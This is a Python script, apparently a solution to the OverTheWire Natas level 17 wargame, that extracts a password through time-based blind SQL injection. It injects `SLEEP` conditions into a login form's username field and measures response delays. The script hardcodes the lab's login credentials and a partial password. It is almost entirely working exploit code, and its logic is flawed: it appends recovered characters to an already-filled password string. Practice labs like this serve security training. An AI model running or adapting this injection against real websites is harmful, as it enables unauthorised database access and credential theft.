import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

CHAR_SET = string.ascii_letters + string.digits
password = "DOr1cbKdfjyxlpxgDsDnbRf6ZdlClgC"

for pos in range(1, 33):
    for char in CHAR_SET:
        payload = f'natas18" AND IF(BINARY SUBSTRING(password, {pos}, 1)="{char}", SLEEP(3), 0)-- a'
        start_time = time.time()
        r = requests.post(url, auth=auth, data={"username":payload})
        waste_time= time.time() - start_time
        
        if(waste_time >= 3):
            password += char
            print(f"[+] {char} is true char in {pos} of pwd")
            break
        else:
            print(f"[-] {char} isn't true char in {pos} pos")
            
print(password)
